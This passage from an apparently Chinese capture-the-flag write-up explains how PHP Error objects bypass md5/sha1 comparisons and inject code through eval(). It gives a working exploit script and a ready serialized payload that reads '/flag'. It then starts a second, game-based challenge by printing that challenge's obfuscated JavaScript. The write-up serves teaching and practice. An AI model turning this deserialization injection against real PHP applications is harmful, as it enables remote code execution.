src="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png"></a></p><p>可以看到$a即使与$b是不同的对象，但是它们的md5值与sha1值是相同。</p><p>如果还有eval函数呢？我们再来构造一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们刚刚发现在输出的内容中包含当前的错误信息’payload’，那假如将’payload’改为<code>?&gt;&lt;?php phpinfo();?&gt;</code>，那么此时$a的值应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: ?&gt;&lt;?php phpinfo();?&gt; ?&gt; in D:\phpstudy_pro\WWW\test1.php:3 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>此时我们我们就成功构造了一个查看phpinfo的php代码，需要注意的是我们的payload前面还有<code>?&gt;</code> 字符串是因为我们需要利用?&gt;来将前面的&lt;?php闭合， <code>Exception</code> 类与 <code>Error</code> 的 <code>__toString</code> 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: payload in /var/www/html/tmp/index.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>进入<code>eval()</code>函数会类似于：<code>eval(&quot;...Error: &lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ，所以需要用?&gt;闭合一下，也就是<code>&lt;?php ...... eval(&quot;...Error: ?&gt;&lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ，这样我们的命令就可以成功执行了：</p><p><a href="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png"></a></p><p>成功查看phpinfo。</p><p>Expetion类也与Error的使用和结果完全一样，大家可以自己去尝试以下。</p><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><p>因为Expetion类的使用版本是php5和php7，Error类的使用版本是php7，所以我们需要查看相应的题目环境来判断应该使用哪一个。在这道题目中，php版本是7.2.34，我们可以选择使用Error类。</p><p>接着我们审计代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里对a变量与b变量进行了判断，这些判断直接用Error类即可绕过，接着看下面的过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了一些字符，过滤了括号使得我们无法调用函数，我们可以使用<code>include &#39;/flag&#39;</code> 来获取flag。还过滤了单引号双引号，直接取反绕过即可。还过滤了<code>?&lt;php</code> 这里我们可以利用<code>&lt;?=</code>短标签绕过。给出EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$p</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$q</span> = <span class="keyword">new</span> <span class="title class_">Snert</span>();</span><br><span class="line"><span class="variable">$q</span>-&gt;a = <span class="variable">$o</span>;</span><br><span class="line"><span class="variable">$q</span>-&gt;b = <span class="variable">$p</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$q</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行EXP，得到payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?snert_is_good=O%3A5%3A%22Snert%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A1%3A%22b%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="别踩白块儿"><a href="#别踩白块儿" class="headerlink" title="别踩白块儿"></a>别踩白块儿</h2><p>打开环境，是一个别踩白块儿的游戏界面：</p><p><a href="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png"></a></p><p>玩了很久都上不了50分，那么可想而知这个题目不会通过玩游戏拿到flag（不可能是我菜，逃）。</p><p>查看网站源码，发现一个可疑的js文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>,_0xodh_=[<span class="string">&#x27;_0xodh&#x27;</span>],_0x5438=[_0xodh,<span class="string">&#x27;a2NsSVo=&#x27;</span>,<span class="string">&#x27;Q1BnanM=&#x27;</span>,<span class="string">&#x27;LTEwMXB4&#x27;</span>,<span class="string">&#x27;5L2g6LaF56We5LqG77yB&#x27;</span>,<span class="string">&#x27;ZUxGako=&#x27;</span>,<span class="string">&#x27;cGFzcw==&#x27;</span>,<span class="string">&#x27;Smh0Skk=&#x27;</span>,<span class="string">&#x27;a1BuR3U=&#x27;</span>,<span class="string">&#x27;VFNYQ2E=&#x27;</span>,<span class="string">&#x27;eHRRZm0=&#x27;</span>,<span class="string">&#x27;c2NvcmU=&#x27;</span>,<span class="string">&#x27;ICAg5ZOI5ZOI77yM5bCx6L+Z5rC05bmz6L+Y5oOz5ou/ZmxhZ++8nw==&#x27;</span>,<span class="string">&#x27;LTQwOHB4&#x27;</span>,<span class="string">&#x27;aU9Kakk=&#x27;</span>,<span class="string">&#x27;dmZvcW4=&#x27;</span>,<span class="string">&#x27;TVFUcWc=&#x27;</span>,<span class="string">&#x27;aW5uZXJIVE1M&#x27;</span>,<span class="string">&#x27;T0pudm4=&#x27;</span>,<span class="string">&#x27;dHhkem4=&#x27;</span>,<span class="string">&#x27;WGRVUUs=&#x27;</span>,<span class="string">&#x27;RXlVR3o=&#x27;</span>,<span class="string">&#x27;c2JxWXU=&#x27;</span>,<span class="string">&#x27;T2NwUm4=&#x27;</span>,<span class="string">&#x27;eW5yVU4=&#x27;</span>,<span class="string">&#x27;WFVlYnI=&#x27;</span>,<span class="string">&#x27;5L2g55qE5pyA57uI5b6X5YiGIA==&#x27;</span>,<span class="string">&#x27;aGRjcU0=&#x27;</span>,<span class="string">&#x27;dFBUemU=&#x27;</span>,<span class="string">&#x27;YmxhY2s=&#x27;</span>,<span class="string">&#x27;dGFyZ2V0&#x27;</span>,<span class="string">&#x27;aW5kZXhPZg==&#x27;</span>,<span class="string">&#x27;Y2xhc3NOYW1l&#x27;</span>,<span class="string">&#x27;UGZzRVg=&#x27;</span>,<span class="string">&#x27;Ylhxb1g=&#x27;</span>,<span class="string">&#x27;eWhOeEY=&#x27;</span>,<span class="string">&#x27;bkR2Q2U=&#x27;</span>,<span class="string">&#x27;Mnw2fDd8MXwzfDV8MHw0&#x27;</span>,<span class="string">&#x27;c3BsaXQ=&#x27;</span>,<span class="string">&#x27;UU5wYlc=&#x27;</span>,<span class="string">&#x27;V2pMaGE=&#x27;</span>,<span class="string">&#x27;cmhBZ2Q=&#x27;</span>,<span class="string">&#x27;TFdUSm0=&#x27;</span>,<span class="string">&#x27;eUx5WUQ=&#x27;</span>,<span class="string">&#x27;dW1UUXo=&#x27;</span>,<span class="string">&#x27;QVJDTkE=&#x27;</span>,<span class="string">&#x27;RXpoTG8=&#x27;</span>,<span class="string">&#x27;Q1BsYks=&#x27;</span>,<span class="string">&#x27;bllwUW0=&#x27;</span>,<span class="string">&#x27;Zm51cXU=&#x27;</span>,<span class="string">&#x27;Z2V0RWxlbWVudEJ5SWQ=&#x27;</span>,<span class="string">&#x27;UExoU3M=&#x27;</span>,<span class="string">&#x27;ZWF0Xw==&#x27;</span>,<span class="string">&#x27;ZV9vbg==&#x27;</span>,<span class="string">&#x27;cmVfZ3I=&#x27;</span>,<span class="string">&#x27;eW91X2E=&#x27;</span>,<span class="string">&#x27;5ri45oiP5bey57uP5byA5aeL77yM5peg6ZyA5YaN5qyh54K55Ye777yB&#x27;</span>,<span class="string">&#x27;TFpjVUs=&#x27;</span>,<span class="string">&#x27;bGZJcks=&#x27;</span>,<span class="string">&#x27;VU96R3E=&#x27;</span>,<span class="string">&#x27;b1BYaFg=&#x27;</span>,<span class="string">&#x27;Q3RQckM=&#x27;</span>,<span class="string">&#x27;bWFpbg==&#x27;</span>,<span class="string">&#x27;V3NNd2s=&#x27;</span>,<span class="string">&#x27;a2poVGc=&#x27;</span>,<span class="string">&#x27;dVB4cGE=&#x27;</span>,<span class="string">&#x27;end1Rm8=&#x27;</span>,<span class="string">&#x27;Q3V0Zmc=&#x27;</span>,<span class="string">&#x27;SGdETFQ=&#x27;</span>,<span class="string">&#x27;VVFQUk0=&#x27;</span>,<span class="string">&#x27;bW92ZSgp&#x27;</span>,<span class="string">&#x27;cm93&#x27;</span>,<span class="string">&#x27;ZVdJUVo=&#x27;</span>,<span class="string">&#x27;b0RqWng=&#x27;</span>,<span class="string">&#x27;RWtGY20=&#x27;</span>,<span class="string">&#x27;UFpOcGI=&#x27;</span>,<span class="string">&#x27;YXBwZW5kQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bU1pclk=&#x27;</span>,<span class="string">&#x27;QlVuSXM=&#x27;</span>,<span class="string">&#x27;YmxJR2c=&#x27;</span>,<span class="string">&#x27;cExZY3M=&#x27;</span>,<span class="string">&#x27;cGFyZW50Tm9kZQ==&#x27;</span>,<span class="string">&#x27;V21IU2s=&#x27;</span>,<span class="string">&#x27;TGRCT2g=&#x27;</span>,<span class="string">&#x27;aW5zZXJ0QmVmb3Jl&#x27;</span>,<span class="string">&#x27;Zmlyc3RDaGlsZA==&#x27;</span>,<span class="string">&#x27;NHwwfDN8Mnwx&#x27;</span>,<span class="string">&#x27;b25jbGljaw==&#x27;</span>,<span class="string">&#x27;TU96UGo=&#x27;</span>,<span class="string">&#x27;blp6d0M=&#x27;</span>,<span class="string">&#x27;Y2hpbGROb2Rlcw==&#x27;</span>,<span class="string">&#x27;bGVuZ3Ro&#x27;</span>,<span class="string">&#x27;V2VJR2g=&#x27;</span>,<span class="string">&#x27;cmVtb3ZlQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bGFzdENoaWxk&#x27;</span>,<span class="string">&#x27;WEd6eWw=&#x27;</span>,<span class="string">&#x27;cGFzczE=&#x27;</span>,<span class="string">&#x27;VEJxbVQ=&#x27;</span>,<span class="string">&#x27;Y2VsbA==&#x27;</span>,<span class="string">&#x27;cHJrWXI=&#x27;</span>,<span class="string">&#x27;Zmxvb3I=&#x27;</span>,<span class="string">&#x27;cmFuZG9t&#x27;</span>,<span class="string">&#x27;Y2VsbCBibGFjaw==&#x27;</span>,<span class="string">&#x27;Y29u&#x27;</span>,<span class="string">&#x27;Z2V0Q29tcHV0ZWRTdHlsZQ==&#x27;</span>,<span class="string">&#x27;VGZOdmI=&#x27;</span>,<span class="string">&#x27;c3R5bGU=&#x27;</span>,<span class="string">&#x27;dG9w&#x27;</span>,<span class="string">&#x27;RXhydU4=&#x27;</span>,<span class="string">&#x27;WWVYU3k=&#x27;</span>,<span class="string">&#x27;jsjINiXamFi.czoRm.gWnQv6bptUUF==&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">function</span>(<span class="params">_0x1b0a33,_0x36c283,_0x35fc1f</span>)&#123;<span class="keyword">function</span> <span class="title function_">_0x311d4f</span>(<span class="params">_0x5a9fdd,_0x2292a4,_0x5e7648,_0xcb1fab,_0x6675df,_0x49fb32</span>)&#123;_0x2292a4=_0x2292a4&gt;&gt;<span class="number">0x8</span>,_0x6675df=<span class="string">&#x27;po&#x27;</span>;<span class="keyword">var</span> _0x73c929=<span class="string">&#x27;shift&#x27;</span>,_0x42487a=<span class="string">&#x27;push&#x27;</span>,_0x49fb32=<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>;<span class="keyword">if</span>(_0x2292a4&lt;_0x5a9fdd)&#123;<span class="keyword">while</span>(--_0x5a9fdd)&#123;_0xcb1fab=_0x1b0a33[_0x73c929]();<span class="keyword">if</span>(_0x2292a4===_0x5a9fdd&amp;&amp;_0x49fb32===<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>&amp;&amp;_0x49fb32[<span class="string">&#x27;length&#x27;</span>]===<span class="number">0xc</span>)&#123;_0x2292a4=_0xcb1fab,_0x5e7648=_0x1b0a33[_0x6675df+<span class="string">&#x27;p&#x27;</span>]();&#125;<span class="keyword">else</span> <span class="keyword">if</span>(_0x2292a4&amp;&amp;_0x5e7648[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/[INXFzRgWnQbptUUF=]/g</span>,<span class="string">&#x27;&#x27;</span>)===_0x2292a4)&#123;_0x1b0a33[_0x42487a](_0xcb1fab);&#125;&#125;_0x1b0a33[_0x42487a](_0x1b0a33[_0x73c929]());&#125;<span class="keyword">return</span> <span class="number">0xe0d46</span>;&#125;;<span class="keyword">return</span> <span class="title function_">_0x311d4f</span>(++_0x36c283,_0x35fc1f)&gt;&gt;_0x36c283^_0x35fc1f;&#125;(_0x5438,<span class="number">0x1e5</span>,<span class="number">0x1e500</span>),_0x5438)&#123;_0xodh_=_0x5438[<span class="string">&#x27;length&#x27;</span>]^<span class="number">0x1e5</span>;&#125;;<span class="keyword">function</span> <span class="title function_">_0x1d2e</span>(<span class="params">_0x2ecb48,_0x3321f5</span>)&#123;_0x2ecb48=~~<span class="string">&#x27;0x&#x27;</span>[<span class="string">&#x27;concat&#x27;</span>](_0x2ecb48[<span class="string">&#x27;slice&#x27;</span>](<span class="number">0x0</span>));<span class="keyword">var</span> _0x28ed54=_0x5438[_0x2ecb48];<span class="keyword">if</span>(_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]===<span class="literal">undefined</span>)&#123;(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x555d4e=<span class="keyword">typeof</span> <span class="variable language_">window</span>!==<span class="string">&#x27;undefined&#x27;</span>?<span class="attr">window</span>:<span class="keyword">typeof</span> process===<span class="string">&#x27;object&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="built_in">require</span>===<span class="string">&#x27;function&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="variable language_">global</span>===<span class="string">&#x27;object&#x27;</span>?<span class="attr">global</span>:<span class="variable language_">this</span>;<span class="keyword">var</span> _0x58cd15=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]||(_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x4aea15</span>)&#123;<span class="keyword">var</span> _0x11308f=<span class="title class_">String</span>(_0x4aea15)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>,<span class="string">&#x27;&#x27;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> _0x2431ae=<span class="number">0x0</span>,_0x400573,_0x4ebd7c,_0x46df95=<span class="number">0x0</span>,_0x291d35=<span class="string">&#x27;&#x27;</span>;_0x4ebd7c=_0x11308f[<span class="string">&#x27;charAt&#x27;</span>](_0x46df95++);~_0x4ebd7c&amp;&amp;(_0x400573=_0x2431ae%<span class="number">0x4</span>?_0x400573*<span class="number">0x40</span>+<span class="attr">_0x4ebd7c</span>:_0x4ebd7c,_0x2431ae++%<span class="number">0x4</span>)?_0x291d35+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span>&amp;_0x400573&gt;&gt;(-<span class="number">0x2</span>*_0x2431ae&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;_0x4ebd7c=_0x58cd15[<span class="string">&#x27;indexOf&#x27;</span>](_0x4ebd7c);&#125;<span class="keyword">return</span> _0x291d35;&#125;);&#125;());_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x252547</span>)&#123;<span class="keyword">var</span> _0x266165=<span class="title function_">atob</span>(_0x252547);<span class="keyword">var</span> _0x5ac6ea=[];<span class="keyword">for</span>(<span class="keyword">var</span> _0x50bcd0=<span class="number">0x0</span>,_0xcf4f7b=_0x266165[<span class="string">&#x27;length&#x27;</span>];_0x50bcd0&lt;_0xcf4f7b;_0x50bcd0++)&#123;_0x5ac6ea+=<span class="string">&#x27;%&#x27;</span>+(<span class="string">&#x27;00&#x27;</span>+_0x266165[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x50bcd0)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x5ac6ea);&#125;;_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>]=&#123;&#125;;_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]=!![];&#125;<span class="keyword">var</span> _0x192bd6=_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48];<span class="keyword">if</span>(_0x192bd6===<span class="literal">undefined</span>)&#123;_0x28ed54=_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>](_0x28ed54);_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48]=_0x28ed54;&#125;<span class="keyword">else</span>&#123;_0x28ed54=_0x192bd6;&#125;<span class="keyword">return</span> _0x28ed54;&#125;;<span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](_0x4c27d2);&#125;<span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;<span class="keyword">var</span> _0x5a88c5=&#123;<span class="string">&#x27;PLhSs&#x27;</span>:<span class="string">&#x27;div&#x27;</span>&#125;;<span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>[<span class="string">&#x27;createElement&#x27;</span>](_0x5a88c5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1&#x27;</span>)]);_0x138beb[<span class="string">&#x27;className&#x27;</span>]=_0x1e165d;<span class="keyword">return</span> _0x138beb;&#125;<span class="keyword">var</span> clock=<span class="literal">null</span>;<span class="keyword">var</span> state=<span class="number">0x0</span>;<span class="keyword">var</span> speed=<span class="number">0x6</span>;<span class="keyword">var</span> result=![];<span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;!&#125;&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4&#x27;</span>),<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5&#x27;</span>),<span class="string">&#x27;sne&#x27;</span>];<span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2a2153=&#123;<span class="string">&#x27;LZcUK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x36db61</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x36db61</span>();&#125;,<span class="string">&#x27;lfIrK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>)&#125;;<span class="keyword">if</span>(!result)&#123;_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;7&#x27;</span>)](init);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;8&#x27;</span>)]);&#125;&#125;<span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x595dcc=&#123;<span class="string">&#x27;WsMwk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;9&#x27;</span>),<span class="string">&#x27;kjhTg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x401487,_0x55dd27</span>)&#123;<span class="keyword">return</span> _0x401487||_0x55dd27;&#125;,<span class="string">&#x27;uPxpa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe37034,_0x1f9e25</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xe37034</span>(_0x1f9e25);&#125;,<span class="string">&#x27;oPXhX&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2f18f4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2f18f4</span>();&#125;,<span class="string">&#x27;CtPrC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xab3c78,_0x4ce2df</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xab3c78</span>(_0x4ce2df);&#125;,<span class="string">&#x27;zwuFo&#x27;</span>:<span class="string">&#x27;move()&#x27;</span>&#125;;result=!![];<span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0x0</span>;_0x340b33&lt;<span class="number">0x4</span>;_0x340b33++)&#123;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;a&#x27;</span>)](createrow);&#125;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>))[<span class="string">&#x27;onclick&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;<span class="keyword">if</span>(_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)]!==_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)])&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>));&#125;<span class="keyword">else</span>&#123;_0x5abac5=_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;e&#x27;</span>)](_0x5abac5,event);_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;f&#x27;</span>)](judge,_0x5abac5);&#125;&#125;;clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;10&#x27;</span>)],<span class="number">0x1e</span>);&#125;<span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xc9cc6=&#123;<span class="string">&#x27;Cutfg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3de745,_0x54f7ec</span>)&#123;<span class="keyword">return</span> _0x3de745+_0x54f7ec;&#125;,<span class="string">&#x27;HgDLT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1e2bf0,_0x10e0fe</span>)&#123;<span class="keyword">return</span> _0x1e2bf0+_0x10e0fe;&#125;,<span class="string">&#x27;UQPRM&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x433c7f,_0x43ecdf</span>)&#123;<span class="keyword">return</span> _0x433c7f+_0x43ecdf;&#125;&#125;;flag=_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;11&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>])+flag[<span class="number">0x1</span>],flag[<span class="number">0x7</span>])+flag[<span class="number">0x5</span>],flag[<span class="number">0x2</span>])+flag[<span 